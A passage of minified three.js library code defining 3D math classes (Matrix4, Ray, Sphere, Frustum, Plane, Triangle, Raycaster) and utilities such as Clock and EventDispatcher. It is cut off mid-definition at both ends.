b=a.elements;this.set(b[0],b[4],b[8],b[12],b[1],b[5],b[9],b[13],b[2],b[6],b[10],b[14],b[3],b[7],b[11],b[15]);return this},extractPosition:function(a){console.warn("DEPRECATED: Matrix4's .extractPosition() has been renamed to .copyPosition().");return this.copyPosition(a)},copyPosition:function(a){var c=this.elements;var b=a.elements;c[12]=b[12];c[13]=b[13];c[14]=b[14];return this},extractRotation:function(){var a=new THREE.Vector3();return function(b){var h=this.elements;var g=b.elements;var f=1/a.set(g[0],g[1],g[2]).length();var e=1/a.set(g[4],g[5],g[6]).length();var c=1/a.set(g[8],g[9],g[10]).length();h[0]=g[0]*f;h[1]=g[1]*f;h[2]=g[2]*f;h[4]=g[4]*e;h[5]=g[5]*e;h[6]=g[6]*e;h[8]=g[8]*c;h[9]=g[9]*c;h[10]=g[10]*c;return this}}(),setRotationFromEuler:function(b,a){console.warn("DEPRECATED: Matrix4's .setRotationFromEuler() has been deprecated in favor of makeRotationFromEuler.  Please update your code.");return this.makeRotationFromEuler(b,a)},makeRotationFromEuler:function(q,t){var l=this.elements;var p=q.x,o=q.y,m=q.z;var J=Math.cos(p),I=Math.sin(p);var G=Math.cos(o),D=Math.sin(o);var A=Math.cos(m),u=Math.sin(m);if(t===undefined||t==="XYZ"){var C=J*A,w=J*u,h=I*A,g=I*u;l[0]=G*A;l[4]=-G*u;l[8]=D;l[1]=w+h*D;l[5]=C-g*D;l[9]=-I*G;l[2]=g-C*D;l[6]=h+w*D;l[10]=J*G}else{if(t==="YXZ"){var s=G*A,r=G*u,F=D*A,B=D*u;l[0]=s+B*I;l[4]=F*I-r;l[8]=J*D;l[1]=J*u;l[5]=J*A;l[9]=-I;l[2]=r*I-F;l[6]=B+s*I;l[10]=J*G}else{if(t==="ZXY"){var s=G*A,r=G*u,F=D*A,B=D*u;l[0]=s-B*I;l[4]=-J*u;l[8]=F+r*I;l[1]=r+F*I;l[5]=J*A;l[9]=B-s*I;l[2]=-J*D;l[6]=I;l[10]=J*G}else{if(t==="ZYX"){var C=J*A,w=J*u,h=I*A,g=I*u;l[0]=G*A;l[4]=h*D-w;l[8]=C*D+g;l[1]=G*u;l[5]=g*D+C;l[9]=w*D-h;l[2]=-D;l[6]=I*G;l[10]=J*G}else{if(t==="YZX"){var H=J*G,E=J*D,k=I*G,j=I*D;l[0]=G*A;l[4]=j-H*u;l[8]=k*u+E;l[1]=u;l[5]=J*A;l[9]=-I*A;l[2]=-D*A;l[6]=E*u+k;l[10]=H-j*u}else{if(t==="XZY"){var H=J*G,E=J*D,k=I*G,j=I*D;l[0]=G*A;l[4]=-u;l[8]=D*A;l[1]=H*u+j;l[5]=J*A;l[9]=E*u-k;l[2]=k*u-E;l[6]=I*A;l[10]=j*u+H}}}}}}l[3]=0;l[7]=0;l[11]=0;l[12]=0;l[13]=0;l[14]=0;l[15]=1;return this},setRotationFromQuaternion:function(a){console.warn("DEPRECATED: Matrix4's .setRotationFromQuaternion() has been deprecated in favor of makeRotationFromQuaternion.  Please update your code.");return this.makeRotationFromQuaternion(a)},makeRotationFromQuaternion:function(o){var f=this.elements;var j=o.x,h=o.y,g=o.z,k=o.w;var r=j+j,a=h+h,l=g+g;var e=j*r,c=j*a,b=j*l;var p=h*a,m=h*l,u=g*l;var A=k*r,t=k*a,s=k*l;f[0]=1-(p+u);f[4]=c-s;f[8]=b+t;f[1]=c+s;f[5]=1-(e+u);f[9]=m-A;f[2]=b-t;f[6]=m+A;f[10]=1-(e+p);f[3]=0;f[7]=0;f[11]=0;f[12]=0;f[13]=0;f[14]=0;f[15]=1;return this},lookAt:function(){var a=new THREE.Vector3();var c=new THREE.Vector3();var b=new THREE.Vector3();return function(f,g,e){var h=this.elements;b.subVectors(f,g).normalize();if(b.length()===0){b.z=1}a.crossVectors(e,b).normalize();if(a.length()===0){b.x+=0.0001;a.crossVectors(e,b).normalize()}c.crossVectors(b,a);h[0]=a.x;h[4]=c.x;h[8]=b.x;h[1]=a.y;h[5]=c.y;h[9]=b.y;h[2]=a.z;h[6]=c.z;h[10]=b.z;return this}}(),multiply:function(a,b){if(b!==undefined){console.warn("DEPRECATED: Matrix4's .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.");return this.multiplyMatrices(a,b)}return this.multiplyMatrices(this,a)},multiplyMatrices:function(Q,P){var w=Q.elements;var O=P.elements;var c=this.elements;var s=w[0],q=w[4],p=w[8],o=w[12];var N=w[1],M=w[5],L=w[9],K=w[13];var F=w[2],E=w[6],D=w[10],C=w[14];var x=w[3],u=w[7],t=w[11],r=w[15];var k=O[0],h=O[4],f=O[8],e=O[12];var J=O[1],I=O[5],H=O[9],G=O[13];var B=O[2],A=O[6],z=O[10],y=O[14];var m=O[3],l=O[7],j=O[11],g=O[15];c[0]=s*k+q*J+p*B+o*m;c[4]=s*h+q*I+p*A+o*l;c[8]=s*f+q*H+p*z+o*j;c[12]=s*e+q*G+p*y+o*g;c[1]=N*k+M*J+L*B+K*m;c[5]=N*h+M*I+L*A+K*l;c[9]=N*f+M*H+L*z+K*j;c[13]=N*e+M*G+L*y+K*g;c[2]=F*k+E*J+D*B+C*m;c[6]=F*h+E*I+D*A+C*l;c[10]=F*f+E*H+D*z+C*j;c[14]=F*e+E*G+D*y+C*g;c[3]=x*k+u*J+t*B+r*m;c[7]=x*h+u*I+t*A+r*l;c[11]=x*f+u*H+t*z+r*j;c[15]=x*e+u*G+t*y+r*g;return this},multiplyToArray:function(e,c,f){var g=this.elements;this.multiplyMatrices(e,c);f[0]=g[0];f[1]=g[1];f[2]=g[2];f[3]=g[3];f[4]=g[4];f[5]=g[5];f[6]=g[6];f[7]=g[7];f[8]=g[8];f[9]=g[9];f[10]=g[10];f[11]=g[11];f[12]=g[12];f[13]=g[13];f[14]=g[14];f[15]=g[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},multiplyVector3:function(a){console.warn("DEPRECATED: Matrix4's .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead.");return a.applyProjection(this)},multiplyVector4:function(a){console.warn("DEPRECATED: Matrix4's .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.");return a.applyMatrix4(this)},multiplyVector3Array:function(){var a=new THREE.Vector3();return function(b){for(var e=0,c=b.length;e<c;e+=3){a.x=b[e];a.y=b[e+1];a.z=b[e+2];a.applyProjection(this);b[e]=a.x;b[e+1]=a.y;b[e+2]=a.z}return b}}(),rotateAxis:function(a){console.warn("DEPRECATED: Matrix4's .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.");a.transformDirection(this)},crossVector:function(a){console.warn("DEPRECATED: Matrix4's .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.");return a.applyMatrix4(this)},determinant:function(){var c=this.elements;var q=c[0],p=c[4],m=c[8],k=c[12];var g=c[1],f=c[5],e=c[9],b=c[13];var a=c[2],t=c[6],s=c[10],r=c[14];var o=c[3],l=c[7],j=c[11],h=c[15];return(o*(+k*e*t-m*b*t-k*f*s+p*b*s+m*f*r-p*e*r)+l*(+q*e*r-q*b*s+k*g*s-m*g*r+m*b*a-k*e*a)+j*(+q*b*t-q*f*r-k*g*t+p*g*r+k*f*a-p*b*a)+h*(-m*f*a-q*e*t+q*f*s+m*g*t-p*g*s+p*e*a))},transpose:function(){var b=this.elements;var a;a=b[1];b[1]=b[4];b[4]=a;a=b[2];b[2]=b[8];b[8]=a;a=b[6];b[6]=b[9];b[9]=a;a=b[3];b[3]=b[12];b[12]=a;a=b[7];b[7]=b[13];b[13]=a;a=b[11];b[11]=b[14];b[14]=a;return this},flattenToArray:function(b){var a=this.elements;b[0]=a[0];b[1]=a[1];b[2]=a[2];b[3]=a[3];b[4]=a[4];b[5]=a[5];b[6]=a[6];b[7]=a[7];b[8]=a[8];b[9]=a[9];b[10]=a[10];b[11]=a[11];b[12]=a[12];b[13]=a[13];b[14]=a[14];b[15]=a[15];return b},flattenToArrayOffset:function(c,b){var a=this.elements;c[b]=a[0];c[b+1]=a[1];c[b+2]=a[2];c[b+3]=a[3];c[b+4]=a[4];c[b+5]=a[5];c[b+6]=a[6];c[b+7]=a[7];c[b+8]=a[8];c[b+9]=a[9];c[b+10]=a[10];c[b+11]=a[11];c[b+12]=a[12];c[b+13]=a[13];c[b+14]=a[14];c[b+15]=a[15];return c},getPosition:function(){var a=new THREE.Vector3();return function(){console.warn("DEPRECATED: Matrix4's .getPosition() has been removed. Use Vector3.getPositionFromMatrix( matrix ) instead.");var b=this.elements;return a.set(b[12],b[13],b[14])}}(),setPosition:function(a){var b=this.elements;b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(u,j){var h=this.elements;var A=u.elements;var s=A[0],q=A[4],o=A[8],k=A[12];var z=A[1],y=A[5],x=A[9],w=A[13];var e=A[2],c=A[6],b=A[10],a=A[14];var t=A[3],r=A[7],p=A[11],l=A[15];h[0]=x*a*r-w*b*r+w*c*p-y*a*p-x*c*l+y*b*l;h[4]=k*b*r-o*a*r-k*c*p+q*a*p+o*c*l-q*b*l;h[8]=o*w*r-k*x*r+k*y*p-q*w*p-o*y*l+q*x*l;h[12]=k*x*c-o*w*c-k*y*b+q*w*b+o*y*a-q*x*a;h[1]=w*b*t-x*a*t-w*e*p+z*a*p+x*e*l-z*b*l;h[5]=o*a*t-k*b*t+k*e*p-s*a*p-o*e*l+s*b*l;h[9]=k*x*t-o*w*t-k*z*p+s*w*p+o*z*l-s*x*l;h[13]=o*w*e-k*x*e+k*z*b-s*w*b-o*z*a+s*x*a;h[2]=y*a*t-w*c*t+w*e*r-z*a*r-y*e*l+z*c*l;h[6]=k*c*t-q*a*t-k*e*r+s*a*r+q*e*l-s*c*l;h[10]=q*w*t-k*y*t+k*z*r-s*w*r-q*z*l+s*y*l;h[14]=k*y*e-q*w*e-k*z*c+s*w*c+q*z*a-s*y*a;h[3]=x*c*t-y*b*t-x*e*r+z*b*r+y*e*p-z*c*p;h[7]=q*b*t-o*c*t+o*e*r-s*b*r-q*e*p+s*c*p;h[11]=o*y*t-q*x*t-o*z*r+s*x*r+q*z*p-s*y*p;h[15]=q*x*e-o*y*e+o*z*c-s*x*c-q*z*b+s*y*b;var f=A[0]*h[0]+A[1]*h[4]+A[2]*h[8]+A[3]*h[12];if(f==0){var g="Matrix4.getInverse(): can't invert matrix, determinant is 0";if(j||false){throw new Error(g)}else{console.warn(g)}this.identity();return this}this.multiplyScalar(1/f);return this},translate:function(a){console.warn("DEPRECATED: Matrix4's .translate() has been removed.")},rotateX:function(a){console.warn("DEPRECATED: Matrix4's .rotateX() has been removed.")},rotateY:function(a){console.warn("DEPRECATED: Matrix4's .rotateY() has been removed.")},rotateZ:function(a){console.warn("DEPRECATED: Matrix4's .rotateZ() has been removed.")},rotateByAxis:function(a,b){console.warn("DEPRECATED: Matrix4's .rotateByAxis() has been removed.")},scale:function(b){var e=this.elements;var a=b.x,f=b.y,c=b.z;e[0]*=a;e[4]*=f;e[8]*=c;e[1]*=a;e[5]*=f;e[9]*=c;e[2]*=a;e[6]*=f;e[10]*=c;e[3]*=a;e[7]*=f;e[11]*=c;return this},getMaxScaleOnAxis:function(){var c=this.elements;var e=c[0]*c[0]+c[1]*c[1]+c[2]*c[2];var b=c[4]*c[4]+c[5]*c[5]+c[6]*c[6];var a=c[8]*c[8]+c[9]*c[9]+c[10]*c[10];return Math.sqrt(Math.max(e,Math.max(b,a)))},makeTranslation:function(a,c,b){this.set(1,0,0,a,0,1,0,c,0,0,1,b,0,0,0,1);return this},makeRotationX:function(a){var e=Math.cos(a),b=Math.sin(a);this.set(1,0,0,0,0,e,-b,0,0,b,e,0,0,0,0,1);return this},makeRotationY:function(a){var e=Math.cos(a),b=Math.sin(a);this.set(e,0,b,0,0,1,0,0,-b,0,e,0,0,0,0,1);return this},makeRotationZ:function(a){var e=Math.cos(a),b=Math.sin(a);this.set(e,-b,0,0,b,e,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var g=Math.cos(b);var m=Math.sin(b);var l=1-g;var k=a.x,j=a.y,h=a.z;var f=l*k,e=l*j;this.set(f*k+g,f*j-m*h,f*h+m*j,0,f*j+m*h,e*j+g,e*h-m*k,0,f*h-m*j,e*h+m*k,l*h*h+g,0,0,0,0,1);return this},makeScale:function(a,c,b){this.set(a,0,0,0,0,c,0,0,0,0,b,0,0,0,0,1);return this},compose:function(a,b,c){console.warn("DEPRECATED: Matrix4's .compose() has been deprecated in favor of makeFromPositionQuaternionScale. Please update your code.");return this.makeFromPositionQuaternionScale(a,b,c)},makeFromPositionQuaternionScale:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);return this},makeFromPositionEulerScale:function(a,b,e,c){this.makeRotationFromEuler(b,e);this.scale(c);this.setPosition(a);return this},makeFrustum:function(g,s,e,p,j,h){var f=this.elements;var r=2*j/(s-g);var o=2*j/(p-e);var q=(s+g)/(s-g);var m=(p+e)/(p-e);var l=-(h+j)/(h-j);var k=-2*h*j/(h-j);f[0]=r;f[4]=0;f[8]=q;f[12]=0;f[1]=0;f[5]=o;f[9]=m;f[13]=0;f[2]=0;f[6]=0;f[10]=l;f[14]=k;f[3]=0;f[7]=0;f[11]=-1;f[15]=0;return this},makePerspective:function(f,c,h,b){var a=h*Math.tan(THREE.Math.degToRad(f*0.5));var g=-a;var j=g*c;var e=a*c;return this.makeFrustum(j,e,g,a,h,b)},makeOrthographic:function(e,r,m,a,j,g){var c=this.elements;var q=r-e;var f=m-a;var b=g-j;var o=(r+e)/q;var l=(m+a)/f;var k=(g+j)/b;c[0]=2/q;c[4]=0;c[8]=0;c[12]=-o;c[1]=0;c[5]=2/f;c[9]=0;c[13]=-l;c[2]=0;c[6]=0;c[10]=-2/b;c[14]=-k;c[3]=0;c[7]=0;c[11]=0;c[15]=1;return this},clone:function(){var a=this.elements;return new THREE.Matrix4(a[0],a[4],a[8],a[12],a[1],a[5],a[9],a[13],a[2],a[6],a[10],a[14],a[3],a[7],a[11],a[15])}};THREE.extend(THREE.Matrix4.prototype,{decompose:function(){var a=new THREE.Vector3();var e=new THREE.Vector3();var c=new THREE.Vector3();var b=new THREE.Matrix4();return function(f,g,j){var h=this.elements;a.set(h[0],h[1],h[2]);e.set(h[4],h[5],h[6]);c.set(h[8],h[9],h[10]);f=(f instanceof THREE.Vector3)?f:new THREE.Vector3();g=(g instanceof THREE.Quaternion)?g:new THREE.Quaternion();j=(j instanceof THREE.Vector3)?j:new THREE.Vector3();j.x=a.length();j.y=e.length();j.z=c.length();f.x=h[12];f.y=h[13];f.z=h[14];b.copy(this);b.elements[0]/=j.x;b.elements[1]/=j.x;b.elements[2]/=j.x;b.elements[4]/=j.y;b.elements[5]/=j.y;b.elements[6]/=j.y;b.elements[8]/=j.z;b.elements[9]/=j.z;b.elements[10]/=j.z;g.setFromRotationMatrix(b);return[f,g,j]}}()});THREE.Ray=function(a,b){this.origin=(a!==undefined)?a:new THREE.Vector3();this.direction=(b!==undefined)?b:new THREE.Vector3()};THREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(c,b){var a=b||new THREE.Vector3();return a.copy(this.direction).multiplyScalar(c).add(this.origin)},recast:function(){var a=new THREE.Vector3();return function(b){this.origin.copy(this.at(b,a));return this}}(),closestPointToPoint:function(b,c){var a=c||new THREE.Vector3();a.subVectors(b,this.origin);var e=a.dot(this.direction);return a.copy(this.direction).multiplyScalar(e).add(this.origin)},distanceToPoint:function(){var a=new THREE.Vector3();return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);a.copy(this.direction).multiplyScalar(c).add(this.origin);return a.distanceTo(b)}}(),isIntersectionSphere:function(a){return(this.distanceToPoint(a.center)<=a.radius)},isIntersectionPlane:function(a){var b=a.normal.dot(this.direction);if(b!=0){return true}if(a.distanceToPoint(this.origin)==0){return true}return false},distanceToPlane:function(a){var c=a.normal.dot(this.direction);if(c==0){if(a.distanceToPoint(this.origin)==0){return 0}return undefined}var b=-(this.origin.dot(a.normal)+a.constant)/c;return b},intersectPlane:function(a,c){var b=this.distanceToPlane(a);if(b===undefined){return undefined}return this.at(b,c)},applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)},clone:function(){return new THREE.Ray().copy(this)}};THREE.Sphere=function(b,a){this.center=(b!==undefined)?b:new THREE.Vector3();this.radius=(a!==undefined)?a:0};THREE.Sphere.prototype={constructor:THREE.Sphere,set:function(b,a){this.center.copy(b);this.radius=a;return this},setFromCenterAndPoints:function(a,g){var b=0;for(var f=0,c=g.length;f<c;f++){var e=a.distanceToSquared(g[f]);b=Math.max(b,e)}this.center=a;this.radius=Math.sqrt(b);return this},copy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},empty:function(){return(this.radius<=0)},containsPoint:function(a){return(a.distanceToSquared(this.center)<=(this.radius*this.radius))},distanceToPoint:function(a){return(a.distanceTo(this.center)-this.radius)},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=(b*b)},clampPoint:function(b,e){var c=this.center.distanceToSquared(b);var a=e||new THREE.Vector3();a.copy(b);if(c>(this.radius*this.radius)){a.sub(this.center).normalize();a.multiplyScalar(this.radius).add(this.center)}return a},getBoundingBox:function(a){var b=a||new THREE.Box3();b.set(this.center,this.center);b.expandByScalar(this.radius);return b},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius=this.radius*a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&(a.radius===this.radius)},clone:function(){return new THREE.Sphere().copy(this)}};THREE.Frustum=function(g,f,e,c,b,a){this.planes=[(g!==undefined)?g:new THREE.Plane(),(f!==undefined)?f:new THREE.Plane(),(e!==undefined)?e:new THREE.Plane(),(c!==undefined)?c:new THREE.Plane(),(b!==undefined)?b:new THREE.Plane(),(a!==undefined)?a:new THREE.Plane()]};THREE.Frustum.prototype={constructor:THREE.Frustum,set:function(h,g,f,e,c,b){var a=this.planes;a[0].copy(h);a[1].copy(g);a[2].copy(f);a[3].copy(e);a[4].copy(c);a[5].copy(b);return this},copy:function(c){var a=this.planes;for(var b=0;b<6;b++){a[b].copy(c.planes[b])}return this},setFromMatrix:function(r){var j=this.planes;var x=r.elements;var p=x[0],l=x[1],k=x[2],h=x[3];var g=x[4],f=x[5],e=x[6],c=x[7];var b=x[8],a=x[9],w=x[10],u=x[11];var t=x[12],s=x[13],q=x[14],o=x[15];j[0].setComponents(h-p,c-g,u-b,o-t).normalize();j[1].setComponents(h+p,c+g,u+b,o+t).normalize();j[2].setComponents(h+l,c+f,u+a,o+s).normalize();j[3].setComponents(h-l,c-f,u-a,o-s).normalize();j[4].setComponents(h-k,c-e,u-w,o-q).normalize();j[5].setComponents(h+k,c+e,u+w,o+q).normalize();return this},intersectsObject:function(){var a=new THREE.Vector3();return function(f){var c=f.matrixWorld;var e=this.planes;var b=-f.geometry.boundingSphere.radius*c.getMaxScaleOnAxis();a.getPositionFromMatrix(c);for(var g=0;g<6;g++){var h=e[g].distanceToPoint(a);if(h<b){return false}}return true}}(),intersectsSphere:function(c){var e=this.planes;var a=c.center;var b=-c.radius;for(var f=0;f<6;f++){var g=e[f].distanceToPoint(a);if(g<b){return false}}return true},containsPoint:function(a){var b=this.planes;for(var c=0;c<6;c++){if(b[c].distanceToPoint(a)<0){return false}}return true},clone:function(){return new THREE.Frustum().copy(this)}};THREE.Plane=function(b,a){this.normal=(b!==undefined)?b:new THREE.Vector3(1,0,0);this.constant=(a!==undefined)?a:0};THREE.Plane.prototype={constructor:THREE.Plane,set:function(b,a){this.normal.copy(b);this.constant=a;return this},setComponents:function(a,e,c,b){this.normal.set(a,e,c);this.constant=b;return this},setFromNormalAndCoplanarPoint:function(b,a){this.normal.copy(b);this.constant=-a.dot(this.normal);return this},setFromCoplanarPoints:function(){var b=new THREE.Vector3();var a=new THREE.Vector3();return function(f,e,h){var g=b.subVectors(h,e).cross(a.subVectors(f,e)).normalize();this.setFromNormalAndCoplanarPoint(g,f);return this}}(),copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,b){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(b,e){var c=this.distanceToPoint(b);var a=e||new THREE.Vector3();return a.copy(this.normal).multiplyScalar(c)},isIntersectionLine:function(a){var c=this.distanceToPoint(a.start);var b=this.distanceToPoint(a.end);return(c<0&&b>0)||(b<0&&c>0)},intersectLine:function(){var a=new THREE.Vector3();return function(c,f){var b=f||new THREE.Vector3();var g=c.delta(a);var h=this.normal.dot(g);if(h==0){if(this.distanceToPoint(c.start)==0){return b.copy(c.start)}return undefined}var e=-(c.start.dot(this.normal)+this.constant)/h;if(e<0||e>1){return undefined}return b.copy(g).multiplyScalar(e).add(c.start)}}(),coplanarPoint:function(b){var a=b||new THREE.Vector3();return a.copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var b=new THREE.Vector3();var a=new THREE.Vector3();return function(e,f){f=f||new THREE.Matrix3().getNormalMatrix(e);var g=b.copy(this.normal).applyMatrix3(f);var c=this.coplanarPoint(a);c.applyMatrix4(e);this.setFromNormalAndCoplanarPoint(g,c);return this}}(),translate:function(a){this.constant=this.constant-a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&(a.constant==this.constant)},clone:function(){return new THREE.Plane().copy(this)}};THREE.Math={clamp:function(e,f,c){return(e<f)?f:((e>c)?c:e)},clampBottom:function(b,c){return b<c?c:b},mapLinear:function(b,c,a,f,e){return f+(b-c)*(e-f)/(a-c)},smoothstep:function(b,c,a){if(b<=c){return 0}if(b>=a){return 1}b=(b-c)/(a-c);return b*b*(3-2*b)},smootherstep:function(b,c,a){if(b<=c){return 0}if(b>=a){return 1}b=(b-c)/(a-c);return b*b*b*(b*(b*6-15)+10)},random16:function(){return(65280*Math.random()+255*Math.random())/65535},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*(0.5-Math.random())},sign:function(a){return(a<0)?-1:((a>0)?1:0)},degToRad:function(){var a=Math.PI/180;return function(b){return b*a}}(),radToDeg:function(){var a=180/Math.PI;return function(b){return b*a}}()};THREE.Triangle=function(f,e,g){this.a=(f!==undefined)?f:new THREE.Vector3();this.b=(e!==undefined)?e:new THREE.Vector3();this.c=(g!==undefined)?g:new THREE.Vector3()};THREE.Triangle.normal=function(){var a=new THREE.Vector3();return function(h,f,k,j){var e=j||new THREE.Vector3();e.subVectors(k,f);a.subVectors(h,f);e.cross(a);var g=e.lengthSq();if(g>0){return e.multiplyScalar(1/Math.sqrt(g))}return e.set(0,0,0)}}();THREE.Triangle.barycoordFromPoint=function(){var a=new THREE.Vector3();var c=new THREE.Vector3();var b=new THREE.Vector3();return function(q,p,m,j,w){a.subVectors(j,p);c.subVectors(m,p);b.subVectors(q,p);var o=a.dot(a);var l=a.dot(c);var k=a.dot(b);var g=c.dot(c);var e=c.dot(b);var h=(o*g-l*l);var t=w||new THREE.Vector3();if(h==0){return t.set(-2,-1,-1)}var f=1/h;var s=(g*k-l*e)*f;var r=(o*e-l*k)*f;return t.set(1-s-r,r,s)}}();THREE.Triangle.containsPoint=function(){var a=new THREE.Vector3();return function(g,h,f,j){var e=THREE.Triangle.barycoordFromPoint(g,h,f,j,a);return(e.x>=0)&&(e.y>=0)&&((e.x+e.y)<=1)}}();THREE.Triangle.prototype={constructor:THREE.Triangle,set:function(f,e,g){this.a.copy(f);this.b.copy(e);this.c.copy(g);return this},setFromPointsAndIndices:function(b,e,c,a){this.a.copy(b[e]);this.b.copy(b[c]);this.c.copy(b[a]);return this},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3();var b=new THREE.Vector3();return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,this.b);return a.cross(b).length()*0.5}}(),midpoint:function(b){var a=b||new THREE.Vector3();return a.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(b){var a=b||new THREE.Plane();return a.setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},equals:function(a){return a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)},clone:function(){return new THREE.Triangle().copy(this)}};THREE.Vertex=function(a){console.warn("THREE.Vertex has been DEPRECATED. Use THREE.Vector3 instead.");return a};THREE.UV=function(b,a){console.warn("THREE.UV has been DEPRECATED. Use THREE.Vector2 instead.");return new THREE.Vector2(b,a)};THREE.Clock=function(a){this.autoStart=(a!==undefined)?a:true;this.startTime=0;this.oldTime=0;this.elapsedTime=0;this.running=false};THREE.Clock.prototype={constructor:THREE.Clock,start:function(){this.startTime=window.performance!==undefined&&window.performance.now!==undefined?window.performance.now():Date.now();this.oldTime=this.startTime;this.running=true},stop:function(){this.getElapsedTime();this.running=false},getElapsedTime:function(){this.getDelta();return this.elapsedTime},getDelta:function(){var b=0;if(this.autoStart&&!this.running){this.start()}if(this.running){var a=window.performance!==undefined&&window.performance.now!==undefined?window.performance.now():Date.now();b=0.001*(a-this.oldTime);this.oldTime=a;this.elapsedTime+=b}return b}};THREE.EventDispatcher=function(){};THREE.EventDispatcher.prototype={constructor:THREE.EventDispatcher,addEventListener:function(b,c){if(this._listeners===undefined){this._listeners={}}var a=this._listeners;if(a[b]===undefined){a[b]=[]}if(a[b].indexOf(c)===-1){a[b].push(c)}},hasEventListener:function(b,c){if(this._listeners===undefined){return false}var a=this._listeners;if(a[b]!==undefined&&a[b].indexOf(c)!==-1){return true}return false},removeEventListener:function(c,e){if(this._listeners===undefined){return}var b=this._listeners;var a=b[c].indexOf(e);if(a!==-1){b[c].splice(a,1)}},dispatchEvent:function(f){if(this._listeners===undefined){return}var e=this._listeners;var a=e[f.type];if(a!==undefined){f.target=this;for(var c=0,b=a.length;c<b;c++){a[c].call(this,f)}}}};(function(g){g.Raycaster=function(o,q,p,m){this.ray=new g.Ray(o,q);if(this.ray.direction.lengthSq()>0){this.ray.direction.normalize()}this.near=p||0;this.far=m||Infinity};var b=new g.Sphere();var c=new g.Ray();var h=new g.Plane();var k=new g.Vector3();var f=new g.Vector3();var j=new g.Matrix4();var a=function(o,m){return o.distance-m.distance};var e=function(H,y,o){if(H instanceof g.Particle){f.getPositionFromMatrix(H.matrixWorld);var r=y.ray.distanceToPoint(f);if(r>H.scale.x){return o}o.push({distance:r,point:H.position,face:null,object:H})}else{if(H instanceof g.LOD){f.getPositionFromMatrix(H.matrixWorld);var r=y.ray.origin.distanceTo(f);e(H.getObjectForDistance(r),y,o)}else{if(H instanceof g.Mesh){f.getPositionFromMatrix(H.matrixWorld);b.set(f,H.geometry.boundingSphere.radius*H.matrixWorld.getMaxScaleOnAxis());if(!y.ray.isIntersectionSphere(b)){return o}var s=H.geometry;var t=s.vertices;var q=H.material instanceof g.MeshFaceMaterial;var z=q===true?H.material.materials:null;var p=H.material.side;var G,E,D,C;var A=y.precision;j.getInverse(H.matrixWorld);c.copy(y.ray).applyMatrix4(j);for(var B=0,w=s.faces.length;B<w;B++){var u=s.faces[B];var x=q===true?z[u.materialIndex]:H.material;if(x===undefined){continue}h.setFromNormalAndCoplanarPoint(u.normal,t[u.a]);var F=c.distanceToPlane(h);if(Math.abs(F)<A){continue}if(F<0){continue}p=x.side;if(p!==g.DoubleSide){var m=c.direction.dot(h.normal);if(!(p===g.FrontSide?m<0:m>0)){continue}}if(F<y.near||F>y.far){continue}k=c.at(F,k);if(u instanceof g.Face3){G=t[u.a];E=t[u.b];D=t[u.c];if(!g.Triangle.containsPoint(k,G,E,D)){continue}}else{if(u instanceof g.Face4){G=t[u.a];E=t[u.b];D=t[u.c];C=t[u.d];if((!g.Triangle.containsPoint(k,G,E,C))&&(!g.Triangle.containsPoint(k,E,D,C))){continue}}else{throw Error("face type not supported")}}o.push({distance:F,point:y.ray.at(F),face:u,faceIndex:B,object:H})}}}}};var l=function(p,o,r){var s=p.getDescendants();for(var q=0,m=s.length;q<m;q++){e(s[q],o,r)}};g.Raycaster.prototype.precision=0.0001;g.Raycaster.prototype.set=function(m,o){this.ray.set(m,o);if(this.ray.direction.length()>0){this.ray.direction.normalize()}};g.Raycaster.prototype.intersectObject=function(o,m){var p=[];if(m===true){l(o,this,p)}e(o,this,p);p.sort(a);return p};g.Raycaster.prototype.intersectObjects=function(r,o){var q=[];for(var p=0,m=r.length;p<m;p++){e(r[p],this,q);if(o===true){l(r[p],this,q)}}q.sort(a);return q}}(THREE));THREE.Object3D=function(){this.id=THREE.Object3DIdCount++;this.name="";this.parent=undefined;this.children=[];this.up=new THREE.Vector3(0,1,0);this.position=new THREE.Vector3();this.rotation=new 